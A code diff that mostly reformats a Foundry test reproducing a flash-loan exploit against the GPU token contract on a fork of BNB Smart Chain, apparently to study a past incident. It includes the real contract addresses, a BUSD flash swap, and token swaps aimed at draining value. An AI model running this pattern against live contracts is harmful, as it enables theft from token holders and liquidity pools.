@@ -13,35 +13,24 @@ import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // Vuln Contract: https://bscscan.com/address/0xf51cbf9f8e089ca48e454eb79731037a405972ce
 
 contract GPUExploit is Test {
+
     IERC20 private gpuToken;
     IERC20 private busd;
     IUniswapV2Pair private busdWbnbPair;
     IUniswapV2Router private router;
 
     modifier balanceLog() {
-        emit log_named_decimal_uint(
-            "Attacker BUSD Balance Before exploit",
-            getBalance(busd),
-            18
-        );
+        emit log_named_decimal_uint("Attacker BUSD Balance Before exploit", getBalance(busd), 18);
         _;
-        emit log_named_decimal_uint(
-            "Attacker BUSD Balance After exploit",
-            getBalance(busd),
-            18
-        );
+        emit log_named_decimal_uint("Attacker BUSD Balance After exploit", getBalance(busd), 18);
     }
 
     function setUp() external {
         vm.createSelectFork("bsc", 38_539_572);
         gpuToken = IERC20(0xf51CBf9F8E089Ca48e454EB79731037a405972ce);
         busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
-        busdWbnbPair = IUniswapV2Pair(
-            0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE
-        );
-        router = IUniswapV2Router(
-            payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
-        );
+        busdWbnbPair = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
+        router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
         busd.approve(address(router), type(uint256).max);
         gpuToken.approve(address(router), type(uint256).max);
     }
@@ -50,22 +39,14 @@ contract GPUExploit is Test {
         busdWbnbPair.swap(22_600 ether, 0, address(this), "0x42");
     }
 
-    function getPath(
-        address token0,
-        address token1
-    ) internal pure returns (address[] memory) {
+    function getPath(address token0, address token1) internal pure returns (address[] memory) {
         address[] memory path = new address[](2);
         path[0] = token0;
         path[1] = token1;
         return path;
     }
 
-    function pancakeCall(
-        address sender,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) external {
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         //Buy tokens with flashloaned busd
         _swap(amount0, busd, gpuToken);
 
@@ -84,15 +65,12 @@ contract GPUExploit is Test {
 
     function _swap(uint256 amountIn, IERC20 tokenA, IERC20 tokenB) private {
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn,
-            0,
-            getPath(address(tokenA), address(tokenB)),
-            address(this),
-            block.timestamp
+            amountIn, 0, getPath(address(tokenA), address(tokenB)), address(this), block.timestamp
         );
     }
 
     function getBalance(IERC20 token) private view returns (uint256) {
         return token.balanceOf(address(this));
     }
+
 }
